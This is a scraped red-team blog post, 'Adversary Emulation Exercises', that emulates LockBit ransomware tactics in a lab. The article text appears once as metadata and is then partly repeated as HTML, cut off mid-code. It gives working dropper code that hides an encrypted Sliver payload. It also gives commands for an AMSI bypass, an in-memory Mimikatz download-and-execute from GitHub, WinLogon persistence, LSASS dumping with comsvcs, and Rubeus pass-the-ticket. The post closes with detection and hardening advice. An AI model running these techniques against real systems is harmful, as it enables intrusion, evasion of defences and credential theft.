financial services sector on ransomware gangs and find an adversary that can be emulated. FS-ISAC is a trusted source for this information and in their latest report they specifically name LockBit as the primary threat. Sophos has a rundown on LockBit 3.0, including a deep dive into their leaked tool sets and a section on their initial access. The tooling we observed the attackers using included a package from GitHub called Backstab. The primary function of Backstab is, as the name implies, to sabotage the tooling that analysts in security operations centers use to monitor for suspicious activity in real time. The utility uses Microsoft’s own Process Explorer driver (signed by Microsoft) to terminate protected anti-malware processes and disable EDR utilities. Both Sophos and other researchers have observed LockBit attackers using Cobalt Strike, which has become a nearly ubiquitous attack tool among ransomware threat actors, and directly manipulating Windows Defender to evade detection. This has given us two critical pieces of information. 1) The adversary uses Cobalt Strike primarily and 2) They use an open source software (OSS) tool called Backstab to kill the endpoint detection and response software (EDR). Later it is also mentioned that LockBit deploys Mimikatz post exploitation in order to grab passwords, so we’ll include that as well. This gives us some primary goals during testing to evaluate. Importantly, we don’t have to stick with just LockBit. There are any number of adversary groups out there at one time and they are all constantly evolving their techniques, so you should have the freedom to introduce new TTPs where there is an identified weakness. What tools to use Sliver When it comes to free C2’s, you’re not short of options. You can even find cracked copies of most of the paid platforms. However, for our needs, Sliver will more than suffice. They have a wide range of post exploitation tools and can output in a few different formats. They also have support for Cobalt Strikes beacon object file format (BOF), which will come in very handy later as the emulation progresses past the TTPs decided on above. Mimikatz Mimikatz is a ubiquitous tool used post exploitation in order to dump passwords. It’s used for post exploitation tasks like elevating privileges, move laterally, and extract passwords. It’s marked by every EDR out there, so changing how it’s dropped is important. Backstab Like Sophos explained, Backstab is a tool employed by adversary groups in order to defeat EDR. It’s publicly available on GitHub, you just need to download and compile it. I suggest following CptMeelo here for how to make your compiled version mobile easily. The author describes Backstab as follows: Have these local admin credentials but the EDR is standing in the way? Unhooking or direct syscalls are not working against the EDR? Well, why not just kill it? Backstab is a tool capable of killing antimalware protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, which is signed by Microsoft. We can use this tool to kill any running process on the system by just giving it a PID. Developing the dropper As we are looking to bypass a real endpoint protection software (EPP) for this mock exercise, we should spend a moment touching on how the dropper will be developed, different bypass methods used, and different obfuscation techniques. The general idea will be to have a Sliver payload that is encrypted at rest in the resources section of an executable and, when launched, connects back to the primary C2 to allow us to drop further tools and perform additional actions. It’s nothing innovative, but it works for this. Obfuscating function calls When loading our payload, we have to do a number of things. This includes allocating the memory space, setting memory permissions, and executing it. These are all functions that reverse engineers and malware analysts look for, so let’s make it harder. Take, for example, the function CreateThread. Malware loves to use this for executing memory locations once a payload is copied into there, and so obviously this will raise flags when spotted. But what if you could hide it entirely on your import table? If you go to the MSDN documentation of CreateThread you will see the parameters it takes: 1 2 3 4 5 6 7 8 HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId ); We can use this in our implant to avoid having to import at run time by inserting this line before the function call: 1 HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId ); What we’ve done here is creating a WINAPI pointer to the function, and it can be done for a lot of our imports. Encrypting our payload The fastest way to be caught is to use a payload easily identifiable to the EPP. The easiest way to not be caught, then, is to encrypt our payload until run time. For this section, I updated the Python script from Sektor7’s red team operator course to be Python3 compatible. This way, we can now feed our outputted shellcode file from Sliver into our encrypt function, get a key and encrypted payload, and then hide that further in our dropper. I don’t want to share too much of reenz0h’s work, so I’ll keep it simple by supplying only pieces I’ve found also on StackOverflow from a decade ago. The padding function is as follows: 1 2 3 4 def pad(s): length = 16 - (len(s) % 16) s += bytes([length])*length return s And the encrypting function is as follows: 1 2 3 4 5 6 7 8 def aesenc(plaintext, key): iv = 16*&#39;\\x00&#39; iv = bytearray(iv, &#39;utf-8&#39;) k = hashlib.sha256(key).digest() plaintext = pad(plaintext)) cipher = AES.new(k, AES.MODE_CBC, iv) return cipher.encrypt(bytes(plaintext)) We generate a key through using the urandom import and call the aesenc function through this: 1 2 plaintext = open(sys.argv[1], &quot;rb&quot;).read() ciphertext = aesenc(plaintext, KEY) Then to get the output looking nice we do some string manipulation and write it to the resource.ico file: 1 2 3 4 5 print(&#39;AESkey[] = { 0x&#39; + &#39;, 0x&#39;.join(hex(x)[2:] for x in KEY) + &#39; };&#39;) imm_by = bytes(ciphertext) with open(&#39;resource.ico&#39;, &#39;wb&#39;) as file: file.write(imm_by) Then at run time, we decrypt it using the native Windows Crypto API functions: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) { HCRYPTPROV hProv; HCRYPTHASH hHash; HCRYPTKEY hKey; if (!CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){ return -1; } if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash)){ return -1; } if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){ return -1; } if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&amp;hKey)){ return -1; } if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &amp;payload_len)){ return -1; } CryptReleaseContext(hProv, 0); CryptDestroyHash(hHash); CryptDestroyKey(hKey); return 0; } We have all the pieces ready for encrypting and decrypting but how do we tell our app to compile with this as a resource? We will need two additional files for this. resources.h will hold a simple declaration #define FAVICON_ICO 100 and resources.rc will hold the following: 1 2 #include &quot;resources.h&quot; FAVICON_ICO RCDATA resource.ico Retrieving our encrypted payload from the resources section can be done with the below: 1 2 3 4 res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); resHandle = LoadResource(NULL, res); payload = (char *) LockResource(resHandle); payload_len = SizeofResource(NULL, res); Something like this can be used to then compile the code from the CLI. Or you can just use VisualStudios GUI. Putting this altogether, to generate our Sliver payload we need to start a listener and output a beacon to a shellcode format. Feed this through the script and output it encrypted to another ico resource file, which we’ll then include in the resources section of our implant. The process of doing this turned out to be much more complicated than I anticipated. Over the course of building this, I removed the IV declaration because I thought the AES library documentation said that if you don’t supply one, it will auto generate one for you. All fine and good in my mind. That was until I went to decrypt at run time and for some reason the first block of bytes would be decrypted incorrectly. The issue turned out to be that I was mistaken and by not supplying an IV at encryption time, when it came to decrypt, the CBC cipher couldn’t do the first block. But this also highlights the issue with CBC. Other ciphers will derive the IV for subsequent blocks from the first blocks decryption, but with CBC only the first block gets XOR’d with the IV and that’s it. Once past this, the shellcode decoded properly in memory but I still wasn’t seeing a connection back. The final issue here turned out to be that the Shikata Ga Nai encoder needed to be disabled at implant generation time with the flag --disable-sgn in Sliver. Initial access LockBit is able to establish initial access through phishing, exploiting public web apps, or through exposed remote desktop protocol. For the sake of our exercise, we will assume that our target has been phished with a OneNote attachment and the beacon was fetched and executed successfully. Establishing persistence Post exploitation, maintaining persistence is one of the more important steps to take. A common way to do this is to add a registry key to the machine that will run our beacon on startup. Another way to maintain persistence employed by LockBit is to add a key to HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon with the value /v Shell /d &quot;explorer.exe, beacon.batch&quot; /f and load a few configuration options into the batch script for downloading and running it. Testing both of these methods is relevant for determining alert coverage level. Dumping credentials We now have a persistent implant running on the host. Our next step is to get some credentials. We can obfuscate Mimikatz for this an drop it to disk, or we can choose to run it in memory and avoid dropping it to disk entirely. The latter can be done with the following PowerShell: 1 IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds However, running this from the command prompt gets it flagged immediately by the AMSI service on Windows and generates an alert. We need a way to disable or bypass AMSI so that we can continue uninterrupted. A simple search though in GitHub brings us to a page of updated AMSI bypasses. From there, this one-liner was able to disable AMSI: 1 $a=&#39;si&#39;;$b=&#39;Am&#39;;$Ref=[Ref].Assembly.GetType((&#39;System.Management.Automation.{0}{1}Utils&#39;-f $b,$a)); $z=$Ref.GetField((&#39;am{0}InitFailed&#39;-f$a),&#39;NonPublic,Static&#39;);$z.SetValue($null,$true) Let’s break this down. First I declare si and Am as two variables. I then get the type of AmsiUtils which looks like the below. Then I use the type to get the field from amsiInitFailed called &#39;NonPublic,Static&#39; and set it to True. Compare the below images to see what the field looks like before and after the completed AMSI bypass. This technique is an evolution to the one from Matt Graeber discovered in 2016, with the only change really being additional obfuscation. It allowed for us to download and execute Mimikatz in memory which is what we needed for progressing to the next step. What about Backstab? Backstab simply wasn’t needed for this. Had there been a different EDR running to try and protect us, it would have come more into play then, but as it stood an AMSI bypass was all it took to let us run through the Defender protected domain unimpeded. For testing’s sake, Backstab was dropped to disk in order to evaluate the detection and used to kill a number of processes, all of which Defender let happen without a care in the world. Exfiltrating from the fileshare Often times in these exercises people think of domain admin as the end-all be-all goal. Unlocking this should unlock the keys to the kingdom. And blue teams know this, which is why there is an absurd amount of alerting around the role. So always gunning for getting DA may actually get your cover blown faster than determining what is valuable to the company and taking that. In our case, since we are a financial services company, this will be financial information such as customer records improperly stored in a fileshare. And exfiltrating these is actually on track for ransomware gangs, they have pivoted to not just encrypting files but also stealing them to ensure a ransom is paid. In our example, there are a couple file shares. One has general scripts and one with financial information. The financial information share is privileged to only a few teams but the script share is wide open to most members in order to facilitate faster sharing. As it so happens, a Windows admin on the IT team also stores their automation scripts here and the file server needs one of them to stop and start a service on a schedule. We can change that script that it is reading from to do its normal actions, but at the end download and execute our beacon from the C2. Then all we have to do is wait for this service to run and we should see a new session generated in Sliver. Now that we have the new machine compromised, we want to do the same thing we did on the first server and bypass AMSI before dumping users with Mimikatz. Then we run through the same process of elevating to this new user and access the share with their permissions before finally exfiltrating the sensitive documents. What if we wanted to do something more interesting though? What we did here did get us results, but it made a lot of noise and it was a little hacky. Let’s rewind back to when we first dropped the beacon. Evolving the attack After dropping the beacon and getting execution and then persistence, the next step was to dump credentials through Mimikatz and an AMSI patch. That’s all fine and dandy, but Sliver offers built in tools to do a lot of this. This was mentioned briefly in January in the rundown of Sliver v Havoc, but let’s take the opportunity and really flex Armory here. First, I want to determine the users password. There’s a lot of options for doing this, but let’s just ask them. Armory has an option for this called c2tc-askcreds which will pop a box and ask them to enter their username and password. When they enter their credentials here, you should see this reflected back in the Sliver console. After getting credentials, what’s next? The prior method for lateral movement was suboptimal. It relied on taking advantage of a poorly configured service. We don’t need to do that though. Another method is to use SharpMapExec which we can use in conjunction with the newly acquired credentials to see if there are any high level saved accounts in LSASS process memory. 1 sharpmapexec ntlm winrm /user:USER /password:PASSWORD /computername:COMPNAME /domain:culbertreport.com /m:comsvcs Locate a user who looks privileged and grab their password value! But wait! There’s more! An even easier method to dump LSASS is to use the built in DLL comsvcs.dll and then exfiltrate that dumped file. This will just require further examination in Mimikatz or a similar tool. You can use Sliver to determine the LSASS Process ID (PID). 1 rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full A final alternative approach is to go hands on keyboard, open an RDP session, and run Process Hacker as an Admin and make a dump of LSASS that way, again examining it with Mimikatz. Regardless of what method you choose, I now have their encrypted credentials, so what can I do with them? Through Armory, I can additionally use Rubeus to generate a Kerberos ticket granting ticket and apply it to our current session. 1 rubeus asktgt /user:USERNAME /rc4:PASSWORD /ptt The /ptt is what will apply this to our current shell. Now that we have this, just enter a new PowerShell session on the fileshare and bob’s your uncle. Results This lab is definitely bordering on a worst case scenario. There is no enterprise EDR and no SIEM and the only defense is Defender. Regardless, our imaginary IT/Sec team should come away from this emulation with a lot of knowledge now about insecure permissions, overly permissive service boundaries, and improperly secured LSASS. Our dropper was able to run uninhibited after decrypting in memory and utilizing a number of suspicious Windows API calls, Mimikatz was entered into the command prompt and this didn’t set off an alarm, and Backstab could kill processes with impunity. After the adversary TTPs were run through, additional TTPs were introduced in the form of SharpMapExec and Rubeus and neither of those were stopped or alerted on either. Taking what was learned here, I should be able to present this to my leadership team in order to justify new expenses like a SIEM for logging and alerting and a better EDR solution. But what kind of alerts should be generated? Relying on static signatures of the binary and payload code is easy to bypass, but behavioral alerting is a lot trickier to get around. For instance, our registry modification should always create an alert especially when an item is added to run at startup. Then following that, PowerShell commands like InvokeExpression(IEX) and Net.WebClient are common commands used in attack scenarios and should also generate an alert on use. Additionally, using comsvcs or any other method to access LSASS should generate an alert. Speaking of, LSASS protection is a major priority for many companies. Had this been enabled, SharpMapExec and Mimikatz would not have been able to pull passwords out of that memory space. Microsoft has extensive documentation on how LSASS is abused by threat actors and what you can do to protect it. These policies should be rolled out domain wide. Data loss protection (DLP) is something that may come to mind as a possible solution to this scenario. There are a lot of products that offer DLP and very few EDR vendors roll it into their offering, so it would most likely be an additional expense you have to consider. You also have to consider the target threat that DLP addresses. Rarely will it prevent custom protocols from being used to read and send file contents out of the company, its primary target will often instead be insider threats - people who, for one reason or another, try to email or upload sensitive information to outside the bounds of the company. This lab really just scratched the surface of potential methods for privilege elevation, lateral movement, and data exfiltration. There is a lot more that can be done both from the defenders and attackers, such as abusing certificate services as outlined in Certified Pre-Owned. I hope to revisit this soon to explore more of those attack paths as well as containers and cloud security.","headline":"Adversary Emulation Exercises","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Adversary-Emulation-Exercise/"},"url":"/posts/Adversary-Emulation-Exercise/"}</script><title>Adversary Emulation Exercises | Culbert Report</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Culbert Report"><meta name="application-name" content="Culbert Report"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/thumb.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Culbert Report</a></div><div class="site-subtitle font-italic">Get in loser, we're hating AI and bringing back real learning. Site art by Kenton Drumm</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/matt-culbert" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/mattculbert" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['matt','culbertreport.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Adversary Emulation Exercises</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Adversary Emulation Exercises</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1681084800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 10, 2023 </em> </span> <span> Updated <em class="" data-ts="1681155333" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 10, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/">Matt Culbert</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3311 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><h1 id="running-an-adversary-emulation-exercise">Running An Adversary Emulation Exercise</h1><p>Adversary emulation can take many forms, but it will always have the same end goal. Helping companies come away knowing how to defend themselves better. You can bypass every defense and find every flaw but if they don’t come away from the engagement knowing how to better defend their data, then you haven’t generated any value for them, only a payday for yourself. Here I will take a known adversary that is relevant to our mock industry and determine their tactics, techniques, and procedures (TTPs) and then apply that to our domain and evolve the attack with custom methods as the emulation progresses.</p><h2 id="ttps-to-emulate"><span class="mr-2">TTPs to emulate</span><a href="#ttps-to-emulate" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>How do you choose the right TTPs? This is a hard question with many valid answers. You have the government, you have public companies, you have your own experience. Realistically, you will want a combination of all those. For this exercise, I’ll take a report from the financial services sector on ransomware gangs and find an adversary that can be emulated. FS-ISAC is a trusted source for this information <a href="https://www.fsisac.com/hubfs/NavigatingCyber-2023/NavigatingCyber2023-Final.pdf?hsLang=en">and in their latest report</a> they specifically name LockBit as the primary threat. <a href="https://news.sophos.com/en-us/2022/11/30/lockbit-3-0-black-attacks-and-leaks-reveal-wormable-capabilities-and-tooling/">Sophos has a rundown on LockBit 3.0</a>, including a deep dive into their leaked tool sets and a section on their initial access.</p><blockquote><p>The tooling we observed the attackers using included a package from GitHub called Backstab. The primary function of Backstab is, as the name implies, to sabotage the tooling that analysts in security operations centers use to monitor for suspicious activity in real time. The utility uses Microsoft’s own Process Explorer driver (signed by Microsoft) to terminate protected anti-malware processes and disable EDR utilities. Both Sophos and other researchers have observed LockBit attackers using Cobalt Strike, which has become a nearly ubiquitous attack tool among ransomware threat actors, and directly manipulating Windows Defender to evade detection.</p></blockquote><p>This has given us two critical pieces of information. 1) The adversary uses Cobalt Strike primarily and 2) They use an open source software (OSS) tool called Backstab to kill the endpoint detection and response software (EDR). Later it is also mentioned that LockBit deploys Mimikatz post exploitation in order to grab passwords, so we’ll include that as well. This gives us some primary goals during testing to evaluate. Importantly, we don’t have to stick with just LockBit. There are any number of adversary groups out there at one time and they are all constantly evolving their techniques, so you should have the freedom to introduce new TTPs where there is an identified weakness.</p><h2 id="what-tools-to-use"><span class="mr-2">What tools to use</span><a href="#what-tools-to-use" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="sliver"><span class="mr-2">Sliver</span><a href="#sliver" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When it comes to free C2’s, you’re not short of options. You can even find cracked copies of most of the paid platforms. However, for our needs, Sliver will more than suffice. They have a wide range of post exploitation tools and can output in a few different formats. They also have support for Cobalt Strikes beacon object file format (BOF), which will come in very handy later as the emulation progresses past the TTPs decided on above.</p><h3 id="mimikatz"><span class="mr-2">Mimikatz</span><a href="#mimikatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Mimikatz is a ubiquitous tool used post exploitation in order to dump passwords. It’s used for post exploitation tasks like elevating privileges, move laterally, and extract passwords. It’s marked by every EDR out there, so changing how it’s dropped is important.</p><h3 id="backstab"><span class="mr-2">Backstab</span><a href="#backstab" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Like Sophos explained, Backstab is a tool employed by adversary groups in order to defeat EDR. It’s publicly available on GitHub, you just need to download and compile it. I suggest following <a href="https://captmeelo.com/redteam/maldev/2022/10/17/independent-malware.html">CptMeelo here for how to make your compiled version mobile</a> easily. The author describes Backstab as follows:</p><blockquote><p>Have these local admin credentials but the EDR is standing in the way? Unhooking or direct syscalls are not working against the EDR? Well, why not just kill it? Backstab is a tool capable of killing antimalware protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, which is signed by Microsoft.</p></blockquote><p>We can use this tool to kill any running process on the system by just giving it a PID.</p><h2 id="developing-the-dropper"><span class="mr-2">Developing the dropper</span><a href="#developing-the-dropper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As we are looking to bypass a real endpoint protection software (EPP) for this mock exercise, we should spend a moment touching on how the dropper will be developed, different bypass methods used, and different obfuscation techniques. The general idea will be to have a Sliver payload that is encrypted at rest in the resources section of an executable and, when launched, connects back to the primary C2 to allow us to drop further tools and perform additional actions. It’s nothing innovative, but it works for this.</p><h3 id="obfuscating-function-calls"><span class="mr-2">Obfuscating function calls</span><a href="#obfuscating-function-calls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When loading our payload, we have to do a number of things. This includes allocating the memory space, setting memory permissions, and executing it. These are all functions that reverse engineers and malware analysts look for, so let’s make it harder. Take, for example, the function <code class="language-plaintext highlighter-rouge">CreateThread</code>. Malware loves to use this for executing memory locations once a payload is copied into there, and so obviously this will raise flags when spotted. But what if you could hide it entirely on your import table? If you go to the MSDN documentation of <code class="language-plaintext highlighter-rouge">CreateThread</code> you will see the parameters it takes:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
</pre></table></code></div></div><p>We can use this in our implant to avoid having to import at run time by inserting this line before the function call:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE  lpStartAddress,__drv_aliasesMem LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId );
</pre></table></code></div></div><p>What we’ve done here is creating a WINAPI pointer to the function, and it can be done for a lot of our imports.</p><h3 id="encrypting-our-payload"><span class="mr-2">Encrypting our payload</span><a href="#encrypting-our-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The fastest way to be caught is to use a payload easily identifiable to the EPP. The easiest way to not be caught, then, is to encrypt our payload until run time. For this section, I updated the Python script from Sektor7’s red team operator course to be Python3 compatible. This way, we can now feed our outputted shellcode file from Sliver into our encrypt function, get a key and encrypted payload, and then hide that further in our dropper. I don’t want to share too much of reenz0h’s work, so I’ll keep it simple by supplying only pieces I’ve found also on StackOverflow from a decade ago.</p><p>The padding function is as follows:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>def pad(s):
    length = 16 - (len(s) % 16)
    s += bytes([length])*length
    return s
</pre></table></code></div></div><p>And the encrypting function is as follows:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>def aesenc(plaintext, key):
  iv = 16*'\x00'
  iv = bytearray(iv, 'utf-8')
	k = hashlib.sha256(key).digest()
	plaintext = pad(plaintext))
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))
</pre></table></code></div></div><p>We generate a key through using the <code class="language-plaintext highlighter-rouge">urandom</code> import and call the aesenc function through this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>plaintext = open(sys.argv[1], "rb").read()
ciphertext = aesenc(plaintext, KEY)
